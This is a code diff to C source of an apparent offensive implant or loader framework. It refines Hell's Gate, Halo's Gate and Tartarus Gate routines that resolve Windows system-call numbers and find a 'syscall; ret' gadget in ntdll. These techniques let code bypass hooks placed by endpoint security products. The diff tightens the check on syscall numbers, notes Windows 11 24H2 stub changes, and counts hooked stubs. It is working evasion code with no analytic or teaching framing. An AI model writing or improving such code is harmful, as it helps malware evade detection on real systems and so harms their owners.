@@ -32,6 +32,13 @@ static FUNC DWORD NaxHellsGate( PBYTE stub ) {
     if ( stub[ 0 ] != NAX_NT_PROLOGUE_0 || stub[ 1 ] != NAX_NT_PROLOGUE_1 ||
          stub[ 2 ] != NAX_NT_PROLOGUE_2 || stub[ 3 ] != NAX_NT_PROLOGUE_3 )
         return NAX_SC_SSN_INVALID;
+    /* secondary check: SSN high bytes are always zero (`mov eax, ssn` fills
+     * imm32 at +4, SSNs are < 0x2000 on any current build). A classic E9-hook
+     * preserves the prologue and writes its displacement over +4.. but can
+     * also leave high bytes nonzero, and partial clobbers (e.g. a patched
+     * displacement colliding with the SSN imm) would otherwise read out a
+     * bogus-but-plausible number. Zero high bytes = the imm looks real.   */
+    if ( stub[ 6 ] != 0 || stub[ 7 ] != 0 ) return NAX_SC_SSN_INVALID;
     return *(DWORD*)( stub + NAX_NT_OFF_SSN );
 }
 
@@ -77,7 +84,11 @@ static FUNC DWORD NaxHalosGate( HMODULE hNtdll, UINT32 targetHash ) {
     return NAX_SC_SSN_INVALID;
 }
 
-/* ========= [ Tartarus gate — find a `syscall; ret` gadget in ntdll .text ] ========= */
+/* ========= [ Tartarus gate — find a `syscall; ret` gadget in ntdll .text ] =========
+ * Win11 24H2 note: Zw stubs use the VBS/HVCI-branchy layout
+ * (mov r10,r cx; mov eax,ssn; test [SharedUserData+0x308],1; j?; syscall/int 2Eh; ret)
+ * but every stub still contains a plain `0F 05 C3` on the syscall branch, so
+ * the scan below keeps working for both stub generations. */
 static FUNC PVOID NaxFindSyscallGadget( PBYTE ntdll ) {
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
     if ( dos->e_magic != IMAGE_DOS_SIGNATURE ) return NULL;
@@ -172,6 +183,7 @@ FUNC UINT32 NaxSyscallsInit( PNAX_INSTANCE Nax ) {
     NAXE( 11, H_NTTERMINATEPROCESS,        NtTerminateProcess );
 
     UINT32 patched = 0;
+    UINT32 hooked  = 0;
     PBYTE spanLo = NULL, spanHi = NULL;
 
     for ( UINT32 i = 0; i < NAX_SC_COUNT; i++ ) {
@@ -181,6 +193,7 @@ FUNC UINT32 NaxSyscallsInit( PNAX_INSTANCE Nax ) {
 
         DWORD ssn = NaxHellsGate( realStub );
         if ( ssn == NAX_SC_SSN_INVALID ) ssn = NaxHalosGate( hNtdll, E[ i ].hash );
+        if ( ssn == NAX_SC_SSN_INVALID && realStub ) hooked++;   /* HellsGate clean + HalosGate failed -> hooked stub */
         E[ i ].ssn = ssn;
         Nax->Syscalls.Ssn[ i ] = ssn;
 
@@ -235,8 +248,8 @@ FUNC UINT32 NaxSyscallsInit( PNAX_INSTANCE Nax ) {
         NaxDbgx( Nax, "syscall: direct resolve only (gadget=%p)", gadget );
     }
 
-    NaxDbg( Nax, "sc: DONE %u/%u  NtAllocVM=%p NtProtectVM=%p NtFreeVM=%p",
-            patched, (UINT32)NAX_SC_COUNT,
+    NaxDbg( Nax, "sc: DONE %u/%u hooked=%u NtAllocVM=%p NtProtectVM=%p NtFreeVM=%p",
+            patched, (UINT32)NAX_SC_COUNT, hooked,
             (PVOID)Nax->Ntdll.NtAllocateVirtualMemory,
             (PVOID)Nax->Ntdll.NtProtectVirtualMemory,
             (PVOID)Nax->Ntdll.NtFreeVirtualMemory );
